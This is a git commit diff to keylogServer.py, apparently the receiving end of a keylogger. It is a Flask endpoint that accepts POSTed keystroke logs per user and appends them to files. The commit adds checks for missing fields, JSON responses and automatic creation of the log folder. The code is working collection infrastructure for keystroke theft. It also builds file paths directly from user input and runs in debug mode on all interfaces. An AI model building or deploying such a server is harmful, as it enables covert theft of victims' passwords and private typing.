48c4378756359fbe86b44913abd269e8a7d23765
Ashwin <mahesh.ashwin1998@gmail.com>
2020-04-09 02:17:14 -0400

    Update not to crash if keys missing

--- keylogServer.py
+++ keylogServer.py
@@ -1,5 +1,5 @@
 from flask import Flask, jsonify, request
-
+import os
 import json
 
 app = Flask(__name__)
@@ -11,16 +11,22 @@ def index():
 
 @app.route('/sendData', methods=['POST'])
 def getData():
+  if 'user' not in request.form or 'keylogs' not in request.form:
+    return { 'success': 0, 'message': 'Missing keys in post data'}
+
   user, newData = request.form['user'], request.form['keylogs']
-  # user = request.form['user']
 
   logFilePath = './logs/'+user+'_log.out'
   logFile = open(logFilePath, 'a')
   logFile.write(newData)
   logFile.close()
 
-  return 'Received your request for '+user
+  return { 'success': 1, 'message': 'Received data for user: '+user }
 
 if __name__ == "__main__":
+  if not os.path.exists('logs'):
+    print("Creating folder for logs")
+    os.mkdir('logs')
+
   print(f"Log Server is listening on port {port}")
   app.run(debug=True, host='0.0.0.0', port=port)
